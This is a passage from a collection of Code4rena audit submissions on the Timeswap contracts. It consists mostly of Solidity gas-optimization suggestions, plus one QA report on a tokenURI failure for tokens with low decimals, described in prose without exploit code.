of code should be refactored as a function\n\nThose 4 functions are using a refactorable piece of code:\n\n```jsx\nFile: TimeswapConvenience.sol\n549:     function timeswapMintCallback(\n550:         uint256 assetIn,\n551:         uint112 collateralIn,\n552:         bytes calldata data\n553:     ) external override {\n554:         (IERC20 asset, IERC20 collateral, address assetFrom, address collateralFrom) = abi.decode(\n555:             data,\n556:             (IERC20, IERC20, address, address)\n557:         );\n558:         IPair pair = factory.getPair(asset, collateral);\n559: \n560:         require(msg.sender == address(pair), 'E701');\n561: \n562:         IWETH _weth = weth;\n563: \n564:         if (assetFrom == address(this)) {\n565:             _weth.deposit{value: assetIn}();\n566:             asset.safeTransfer(pair, assetIn);\n567:         } else {\n568:             asset.safeTransferFrom(assetFrom, pair, assetIn);\n569:         }\n570: \n571:         if (collateralFrom == address(this)) {\n572:             _weth.deposit{value: collateralIn}();\n573:             collateral.safeTransfer(pair, collateralIn);\n574:         } else {\n575:             collateral.safeTransferFrom(collateralFrom, pair, collateralIn);\n576:         }\n577:     }\n578: \n579:     /// @inheritdoc ITimeswapLendCallback\n580:     function timeswapLendCallback(uint256 assetIn, bytes calldata data) external override { \n581:         (IERC20 asset, IERC20 collateral, address from) = abi.decode(data, (IERC20, IERC20, address));\n582:         IPair pair = factory.getPair(asset, collateral);\n583: \n584:         require(msg.sender == address(pair), 'E701');\n585: \n586:         if (from == address(this)) {\n587:             weth.deposit{value: assetIn}();\n588:             asset.safeTransfer(pair, assetIn);\n589:         } else {\n590:             asset.safeTransferFrom(from, pair, assetIn);\n591:         }\n592:     }\n593: \n594:     /// @inheritdoc ITimeswapBorrowCallback\n595:     function timeswapBorrowCallback(uint112 collateralIn, bytes calldata data) external override {\n596:         (IERC20 asset, IERC20 collateral, address from) = abi.decode(data, (IERC20, IERC20, address));\n597:         IPair pair = factory.getPair(asset, collateral);\n598:         require(msg.sender == address(pair), 'E701');\n599:         if (from == address(this)) {\n600:             weth.deposit{value: collateralIn}();\n601:             collateral.safeTransfer(pair, collateralIn);\n602:         } else {\n603:             collateral.safeTransferFrom(from, pair, collateralIn);\n604:         }\n605:     }\n606: \n607:     /// @inheritdoc ITimeswapPayCallback\n608:     function timeswapPayCallback(uint128 assetIn, bytes calldata data) external override {\n609:         (IERC20 asset, IERC20 collateral, address from) = abi.decode(data, (IERC20, IERC20, address));\n610: \n611:         IPair pair = factory.getPair(asset, collateral);\n612:         require(msg.sender == address(pair), 'E701');\n613: \n614:         if (from == address(this)) {\n615:             weth.deposit{value: assetIn}();\n616:             asset.safeTransfer(pair, assetIn);\n617:         } else {\n618:             asset.safeTransferFrom(from, pair, assetIn);\n619:         }\n620:     }\n```\n\nFor maintainability and readability, I suggest creating a private function (here `_timeswapCallback`) and using it as such:\n\n```jsx\nFile: TimeswapConvenience.sol\n549:     function timeswapMintCallback( \n550:         uint256 assetIn,\n551:         uint112 collateralIn,\n552:         bytes calldata data\n553:     ) external override {\n554:         (IERC20 asset, IERC20 collateral, address assetFrom, address collateralFrom) = abi.decode(\n555:             data,\n556:             (IERC20, IERC20, address, address)\n557:         );\n558:         IPair pair = factory.getPair(asset, collateral);\n559:         _timeswapCallback(asset, pair, assetFrom, assetIn, data);\n560:         _timeswapCallback(asset, pair, collateralFrom, collateralIn, data);\n561:     }\n562: \n563:     /// @inheritdoc ITimeswapLendCallback\n564:     function timeswapLendCallback(uint256 assetIn, bytes calldata data) external override { \n565:         (IERC20 asset, IERC20 collateral, address from) = abi.decode(data, (IERC20, IERC20, address));\n566:         IPair pair = factory.getPair(asset, collateral);\n567:         _timeswapCallback(asset, pair, from, assetIn, data);\n568:     }\n569: \n570:     /// @inheritdoc ITimeswapBorrowCallback\n571:     function timeswapBorrowCallback(uint112 collateralIn, bytes calldata data) external override {\n572:         (IERC20 asset, IERC20 collateral, address from) = abi.decode(data, (IERC20, IERC20, address));\n573:         IPair pair = factory.getPair(asset, collateral);\n574:         _timeswapCallback(asset, pair, from, collateralIn, data);\n575:     }\n576: \n577:     /// @inheritdoc ITimeswapPayCallback\n578:     function timeswapPayCallback(uint128 assetIn, bytes calldata data) external override {\n579:         (IERC20 asset, IERC20 collateral, address from) = abi.decode(data, (IERC20, IERC20, address));\n580:         IPair pair = factory.getPair(asset, collateral);\n581:         _timeswapCallback(asset, pair, from, assetIn, data);\n582:     }\n583: \n584:     function _timeswapCallback(IERC20 asset, IIPair pair, address from, uint256 assetOrCollateralIn) private {\n585:         require(msg.sender == address(pair), 'E701');\n586:         if (from == address(this)) {\n587:             weth.deposit{value: assetOrCollateralIn}();\n588:             asset.safeTransfer(pair, assetOrCollateralIn);\n589:         } else {\n590:             asset.safeTransferFrom(from, pair, assetOrCollateralIn);\n591:         }\n592:     }\n```\n\nNames and arguments can be changed according to the sponsor's preference, this is simply a suggestion. Here, `pair` was evaluated outside of `_timeswapCallback()` and passed as an argument to save gas (1 extra external call).\nThe original piece of code `L562: IWETH _weth = weth;` is also unnecessary as the state variable is immutable.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/36"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Reduction opportunities\n\nTo check the actual size of the reduction, ``hardhat-gas-reporter`` is used. ( https://www.npmjs.com/package/hardhat-gas-reporter ). At each result, it lists how many size of the gas is reduced after the change.\n\n---\n# Title: ``Borrow.sol`` can shorten the code size and gas fee by extracting common functionality into private function\n\nHere are codes which can be shared by a function.\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L368-L369\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L409-L410\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L452-L453\n\nThe above codes use following logic which can be shared:\n```\nIPair pair = params.factory.getPair(params.asset, params.collateral);\nrequire(address(pair) != address(0), 'E501');\n```\n\nHere is an example common function:\n```\nfunction _commonCheck(\n    IFactory factory,\n    IERC20 asset,\n    IERC20 collateral\n) private view returns(IPair pair) {\n    pair = factory.getPair(asset, collateral);\n    require(address(pair) != address(0), 'E501');\n}\n```\n\nThe above function can be used at each place like this:\n```\nIPair pair = _commonCheck(params.factory, params.asset, params.collateral);\n```\n\nHere is the comparison of the gas cost at Borrow.sol\n- Before: 2591800\n- After: 2524220\n- Redution: 67580 (About 2.6% reduction)\n\nBorrow.sol \n- Before: 11.48 KB\n- After: 11.17 KB\n- Reduction: 0.31 KB\n\n---",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/35"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n**Table of Contents:**\n\n- [Gas Report](#gas-report)\n  - [Foreword](#foreword)\n  - [File: CollateralizedDebt.sol](#file-collateralizeddebtsol)\n    - [modifier onlyConvenience()](#modifier-onlyconvenience)\n      - [Inline a modifier that's only used once](#inline-a-modifier-thats-only-used-once)\n  - [File: TimeswapPair.sol](#file-timeswappairsol)\n    - [function mint()](#function-mint)\n      - [Use memory variables for calculation](#use-memory-variables-for-calculation)\n    - [function burn()](#function-burn)\n      - [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof)\n    - [function lend()](#function-lend)\n      - [Use memory variables for calculation](#use-memory-variables-for-calculation-1)\n    - [function borrow()](#function-borrow)\n      - [Use memory variables for calculation](#use-memory-variables-for-calculation-2)\n    - [function pay()](#function-pay)\n      - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n  - [General recommendation](#general-recommendation)\n    - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Foreword\n\n- **Storage-reading optimizations**\n\n> The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). In the paragraphs below, please see the `@audit-issue` tags in the pieces of code's comments for more information about SLOADs that could be saved by caching the mentioned **storage** variables in **memory** variables.\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## File: CollateralizedDebt.sol\n\n### modifier onlyConvenience()\n\n#### Inline a modifier that's only used once\n\nAs `onlyConvenience()` is only used once in this contract (in `function mint()`), it should get inlined to save gas:\n\n```jsx\nFile: CollateralizedDebt.sol\n80:     modifier onlyConvenience() {\n81:         require(msg.sender == address(convenience), 'E403');\n82:         _;\n83:     }\n84: \n85:     function mint(address to, uint256 id) external override onlyConvenience { //@audit onlyConvenience modifier only used only here: inline it.\n86:         _safeMint(to, id);\n87:     }\n```\n\n## File: TimeswapPair.sol\n\n### function mint()\n\n#### Use memory variables for calculation\n\nThe code can be optimized from this:\n\n```jsx\nFile: TimeswapPair.sol\n185:         pool.state.x += param.xIncrease;\n186:         pool.state.y += param.yIncrease;\n187:         pool.state.z += param.zIncrease;\n...\n193:         emit Sync(param.maturity, pool.state.x, pool.state.y, pool.state.z); //@audit can save 3 SLOADs by using memory for calc\n```\n\nto this:\n\n```jsx\nFile: TimeswapPair.sol\n185:         (uint112 _poolStateX, uint112 _poolStateY, uint112 _poolStateZ) = (pool.state.x + param.xIncrease, pool.state.y + param.yIncrease, pool.state.z + param.zIncrease);\n186: \n187:         pool.state.x = _poolStateX;\n188:         pool.state.y = _poolStateY;\n189:         pool.state.z = _poolStateZ;\n...\n195:         emit Sync(param.maturity, _poolStateX, _poolStateY, _poolStateZ);\n```\n\n### function burn()\n\n#### `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```jsx\nFile: TimeswapPair.sol\n225:         require(pool.state.totalLiquidity > 0, 'E206'); //@audit should be != 0\n```\n\nAlso, please enable the Optimizer.\n\n### function lend()\n\n#### Use memory variables for calculation\n\nJust like in `function mint()` ( [Use memory variables for calculation](#use-memory-variables-for-calculation) ), the code can be optimized here by caching the new values for `pool.state.x`, `pool.state.y` and `pool.state.z` :\n\n```jsx\nFile: TimeswapPair.sol\n310:         pool.state.x += param.xIncrease;\n311:         pool.state.y -= param.yDecrease;\n312:         pool.state.z -= param.zDecrease;\n...\n320:         emit Sync(param.maturity, pool.state.x, pool.state.y, pool.state.z);//@audit can save 3 SLOADs by using memory for calc\n```\n\nThe same way, the final code will look like this (with the difference that `yDecrease` and `zDecreased` are used here):\n\n```jsx\n         (uint112 _poolStateX, uint112 _poolStateY, uint112 _poolStateZ) = (pool.state.x + param.xIncrease, pool.state.y - param.yDecrease, pool.state.z - param.zDecrease);\n \n         pool.state.x = _poolStateX;\n         pool.state.y = _poolStateY;\n         pool.state.z = _poolStateZ;\n...\n         emit Sync(param.maturity, _poolStateX, _poolStateY, _poolStateZ);\n```\n\n### function borrow()\n\n#### Use memory variables for calculation\n\nJust like in `function mint()` ( [Use memory variables for calculation](#use-memory-variables-for-calculation) ) and `function lend()`, the code can be optimized here by caching the new values for `pool.state.x`, `pool.state.y` and `pool.state.z` :\n\n```jsx\nFile: TimeswapPair.sol\n432:         pool.state.x -= param.xDecrease;\n433:         pool.state.y += param.yIncrease;\n434:         pool.state.z += param.zIncrease;\n...\n444:         emit Sync(param.maturity, pool.state.x, pool.state.y, pool.state.z);//@audit can save 3 SLOADs by using memory for calc\n\n```\n\nThe same way, the final code will look like this (with the difference that `xDecrease` is used here):\n\n```jsx\n         (uint112 _poolStateX, uint112 _poolStateY, uint112 _poolStateZ) = (pool.state.x - param.xDecrease, pool.state.y + param.yIncrease, pool.state.z + param.zIncrease);\n \n         pool.state.x = _poolStateX;\n         pool.state.y = _poolStateY;\n         pool.state.z = _poolStateZ;\n...\n         emit Sync(param.maturity, _poolStateX, _poolStateY, _poolStateZ);\n```\n\n### function pay()\n\n#### An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  \n  \nCaching the array length in the stack saves around 3 gas per iteration.  \n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```jsx\nFile: TimeswapPair.sol\n480:         for (uint256 i; i < param.ids.length;) { //@audit cache this\n```\n\n## General recommendation\n\n### Use Custom Errors instead of Revert Strings to save Gas\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\n```jsx\nTimeswap/Convenience/contracts/BondInterest.sol:61:        require(msg.sender == address(convenience), 'E403');\nTimeswap/Convenience/contracts/BondPrincipal.sol:61:        require(msg.sender == address(convenience), 'E403');\nTimeswap/Convenience/contracts/CollateralizedDebt.sol:45:        require(_owners[id] != address(0), 'E404');\nTimeswap/Convenience/contracts/CollateralizedDebt.sol:62:        require(id < pair.totalDuesOf(maturity, address(convenience)), 'E614');\nTimeswap/Convenience/contracts/CollateralizedDebt.sol:81:        require(msg.sender == address(convenience), 'E403');\nTimeswap/Convenience/contracts/InsuranceInterest.sol:61:        require(msg.sender == address(convenience), 'E403');\nTimeswap/Convenience/contracts/InsurancePrincipal.sol:61:        require(msg.sender == address(convenience), 'E403');\nTimeswap/Convenience/contracts/Liquidity.sol:52:        require(msg.sender == address(convenience), 'E403');\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:64:        require(address(_factory) != address(0), 'E601');\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:65:        require(address(_weth) != address(0), 'E601');\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:66:        require(address(_factory) != address(_weth), 'E612');\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:75:        require(msg.sender == address(weth));\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:560:        require(msg.sender == address(pair), 'E701');\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:584:        require(msg.sender == address(pair), 'E701');\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:598:        require(msg.sender == address(pair), 'E701');\nTimeswap/Convenience/contracts/TimeswapConvenience.sol:612:        require(msg.sender == address(pair), 'E701');\nTimeswap/Core/contracts/TimeswapFactory.sol:38:        require(_owner != address(0), 'E101');\nTimeswap/Core/contracts/TimeswapFactory.sol:48:        require(asset != collateral, 'E103');\nTimeswap/Core/contracts/TimeswapFactory.sol:49:        require(asset != IERC20(address(0)) && collateral != IERC20(address(0)), 'E101');\nTimeswap/Core/contracts/TimeswapFactory.sol:50:        require(getPair[asset][collateral] == IPair(address(0)), 'E104');\nTimeswap/Core/contracts/TimeswapFactory.sol:61:        require(msg.sender == owner, 'E102');\nTimeswap/Core/contracts/TimeswapFactory.sol:62:        require(_pendingOwner != address(0), 'E101');\nTimeswap/Core/contracts/TimeswapFactory.sol:70:        require(msg.sender == pendingOwner, 'E102');\nTimeswap/Core/contracts/TimeswapPair.sol:131:        require(locked == 1, 'E211');\nTimeswap/Core/contracts/TimeswapPair.sol:151:        require(block.timestamp < param.maturity, 'E202');\nTimeswap/Core/contracts/TimeswapPair.sol:152:        unchecked { require(param.maturity - block.timestamp < 0x100000000, 'E208'); }\nTimeswap/Core/contracts/TimeswapPair.sol:153:        require(param.liquidityTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:154:        require(param.dueTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:155:        require(param.liquidityTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:156:        require(param.dueTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:157:        require(param.xIncrease != 0, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:158:        require(param.yIncrease != 0, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:159:        require(param.zIncrease != 0, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:172:        require(liquidityOut != 0, 'E212');\nTimeswap/Core/contracts/TimeswapPair.sol:217:        require(block.timestamp >= param.maturity, 'E203');\nTimeswap/Core/contracts/TimeswapPair.sol:218:        require(param.assetTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:219:        require(param.collateralTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:220:        require(param.assetTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:221:        require(param.collateralTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:222:        require(param.liquidityIn != 0, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:225:        require(pool.state.totalLiquidity > 0, 'E206');\nTimeswap/Core/contracts/TimeswapPair.sol:273:        require(block.timestamp < param.maturity, 'E202');\nTimeswap/Core/contracts/TimeswapPair.sol:274:        require(param.bondTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:275:        require(param.insuranceTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:276:        require(param.bondTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:277:        require(param.insuranceTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:278:        require(param.xIncrease != 0, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:281:        require(pool.state.totalLiquidity != 0, 'E206');\nTimeswap/Core/contracts/TimeswapPair.sol:342:        require(block.timestamp >= param.maturity, 'E203');\nTimeswap/Core/contracts/TimeswapPair.sol:343:        require(param.assetTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:344:        require(param.collateralTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:345:        require(param.assetTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:346:        require(param.collateralTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:347:        require(\nTimeswap/Core/contracts/TimeswapPair.sol:401:        require(block.timestamp < param.maturity, 'E202');\nTimeswap/Core/contracts/TimeswapPair.sol:402:        require(param.assetTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:403:        require(param.dueTo != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:404:        require(param.assetTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:405:        require(param.dueTo != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:406:        require(param.xDecrease != 0, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:409:        require(pool.state.totalLiquidity != 0, 'E206');\nTimeswap/Core/contracts/TimeswapPair.sol:468:        require(block.timestamp < param.maturity, 'E202');\nTimeswap/Core/contracts/TimeswapPair.sol:469:        require(param.owner != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:470:        require(param.to != address(0), 'E201');\nTimeswap/Core/contracts/TimeswapPair.sol:471:        require(param.to != address(this), 'E204');\nTimeswap/Core/contracts/TimeswapPair.sol:472:        require(param.ids.length == param.assetsIn.length, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:473:        require(param.ids.length == param.collateralsOut.length, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:478:        require(dues.length >= param.ids.length, 'E205');\nTimeswap/Core/contracts/TimeswapPair.sol:482:            require(due.startBlock != BlockNumber.get(), 'E207');\nTimeswap/Core/contracts/TimeswapPair.sol:483:            if (param.owner != msg.sender) require(param.collateralsOut[i] == 0, 'E213');\nTimeswap/Core/contracts/TimeswapPair.sol:484:            require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303');\nTimeswap/Core/contracts/TimeswapPair.sol:514:        require(msg.sender == factory.owner(), 'E216');\n```\n\nI suggest replacing revert strings with custom errors.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/34"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L166\n\n\n# Vulnerability details\n\n## Impact\n\nStandard ERC721 tokenURI call will fail for CollateralizedDebt pools whose underlying pair.asset() or pair.collateral() have decimals lower than 4 whenever the corresponding due quantity is lower than 1e9.\n\nPair's asset and collateral ERC20 can be arbitrary and some ERC20 contracts have decimals lower than 4, so such a combination is possible. In such cases current tokenURI implementation fails, which can be the issue for all integrations down the line as various systems routinely make tokenURI calls.\n\nPlacing severity to be medium per 'Assets not at direct risk, but the function of the protocol or its availability could be impacted', which is the case here as protocol availability is in question when EIP level functionality fails.\n\n## References\n\nhttps://eips.ethereum.org/EIPS/eip-721\n\nhttps://github.com/d-xo/weird-erc20#low-decimals\n\n\n## Proof of Concept\n\nNFTTokenURIScaffold.weiToPrecisionString will fail if used for a token with decimals lower than 4 as subtraction is performed without prior checks:\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L166\n\nNFTTokenURIScaffold.weiToPrecisionString is called by NFTTokenURIScaffold.tokenURI for pair's asset and collateral ERC20:\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L16-L39\n\nNFTTokenURIScaffold.tokenURI is used in CollateralizedDebt.tokenURI:\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/CollateralizedDebt.sol#L46\n\nPair's asset and collateral tokens can be arbitrary, while tokenURI is routinely requested by a variety of external systems\n\n## Recommended Mitigation Steps\n\nConsider adding the check and special care for low decimals case, for example add another naming rule similarly to how `significantDigits > 1e9` case is being handled\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/33"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "#1 using != instead <\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L225\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L225\nby using != instead of > or < to validate can save gas\n\n#2 Simple way to set `assetOut` value\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L238-L239\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L436-L438\nIn the current implementation the value of `assetOut` was set multipleTime. use this to save gas:\n```\nassetOut = _assetOut + feeOut;\n```\n#3  Removing && operator can saving more gas usage \nPOC it can be seen from my report here :\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapFactory.sol#L49\ninstead of using operator && on single require check. using additional require check can save more execution gas.\noccurance :\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapFactory.sol#L49\n\nRecommended Mitigation Steps:\n```\nrequire(asset != IERC20(address(0)), 'E101');\nrequire(collateral != IERC20(address(0)), 'E101');\n```\n\n#4 Simple way to set `assetIn` value\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L189-L190\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L314-L316\nIn the current implementation the value of `assetIn` was set multiple times. use this to save gas:\n```\nassetIn = param.xIncrease + feeStoredIncrease\n```\n#5 Unused `SafeERC20` lib\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L18\nThe `SafeERC20.functions()` was never called in this contract. Remove L6 and L18.\n\n#6 Better way to use library for saving more gas\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/TimeswapConvenience.sol#L29-L35\n\nless gas usage by not declearing library used (L28-L35). Removing line which declare that \n\n    using Mint for mapping(IERC20 => mapping(IERC20 => mapping(uint256 => Native)));\n    using Burn for mapping(IERC20 => mapping(IERC20 => mapping(uint256 => Native)));\n    using Lend for mapping(IERC20 => mapping(IERC20 => mapping(uint256 => Native)));\n    using Withdraw for mapping(IERC20 => mapping(IERC20 => mapping(uint256 => Native)));\n    using Borrow for mapping(IERC20 => mapping(IERC20 => mapping(uint256 => Native)));\n    using Pay for mapping(IERC20 => mapping(IERC20 => mapping(uint256 => Native)));\n    using DeployNative for mapping(IERC20 => mapping(IERC20 => mapping(uint256 => Native)));\n\n and call library.function() directly can saving both deploying and execution gas usage.\n\nfor ex.\n\n    function deployNatives(DeployNatives calldata params) external override {\n        natives.deploy(this, factory, params); \n    }\n    \n\nchange to\n\n DeployNatives.deploy(natives, this, factory, params); //--> Call the library name directly and passed natives to the first argument.\n\n\n\n#7 Unnecessary SafeTransfer Library\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Convenience/contracts/TimeswapConvenience.sol#L28\n\nbecause it was the only SafeERC20.function lib were used, so it better to just use transfer and transferFrom from ERC20.function to saving more gas.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/31"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. considered using bool in `modifier lock()` can save gas\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L130\n\nExample:\n```\npragma solidity =0.8.4;\n\ncontract test {\n\nbool internal _locked = true;\nuint256 internal _lock = 1;\n\nmodifier noReenter() {\n        require(_locked, \"LOCKED\");\n        _locked = true;\n        _;\n        _locked = false;\n    }\nmodifier noReentir(){\n        require(_lock == 1, \"LOCKED\");\n        _lock = 2;\n        _;\n        _lock = 1;\n}\n\n    function abc() public noReenter returns(uint){\n        return 12121;\n        // 22066\n    }\n    function def() public noReentir returns(uint){\n        return 1234;\n        // 23752\n    }\n}\n```\n\n========================================================================\n\n2. `> 0` is less efficient than `!= 0` for uint in require condition\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L225\n\nChange it the same as this: https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L281\n\n========================================================================\n\n3. Shift right instead of dividing by 2\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/SquareRoot.sol#L6\n\nissue information: https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible\n\nTools used\nc4udit\n\n========================================================================\n\n4. multiple `require` can save gas\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapFactory.sol#L49\n\nChange to:\n```\nrequire(asset != IERC20(address(0));\nrequire(collateral != IERC20(address(0)), 'E101');\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/18"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**[S]**: Suggested optimation, save a decent amount of gas without compromising readability;\n\n**[M]**: Minor optimation, the amount of gas saved is minor, change when you see fit;\n\n**[N]**: Non-preferred, the amount of gas saved is at cost of readability, only apply when gas saving is a top priority.\n\n## [S] Avoid unnecessary storage read can save gas\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Core/contracts/TimeswapPair.sol#L56-L64\n\n```solidity\n    function constantProduct(uint256 maturity)\n        external\n        view\n        override\n        returns (uint112, uint112, uint112)\n    {\n        State storage state = pools[maturity].state;\n        return (state.x, state.y, state.z);\n    }\n```\n\nCan be changed to:\n\n```solidity\n    function constantProduct(uint256 maturity)\n        external\n        view\n        override\n        returns (uint112, uint112, uint112)\n    {\n        State memory state = pools[maturity].state;\n        return (state.x, state.y, state.z);\n    }\n```\n\n## [M] \"> 0\" is less efficient than \"!= 0\" for unsigned integers\n\nIt is cheaper to use `!= 0` than `> 0` for uint256.\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Core/contracts/TimeswapPair.sol#L225-L226\n\n```solidity\n        require(pool.state.totalLiquidity > 0, 'E206');\n\n```\n\n## [S] Cache storage variables in the stack can save gas\n\nFor the storage variables that will be accessed multiple times, cache them in the stack can save ~100 gas from each extra read (`SLOAD` after Berlin).\n\nFor 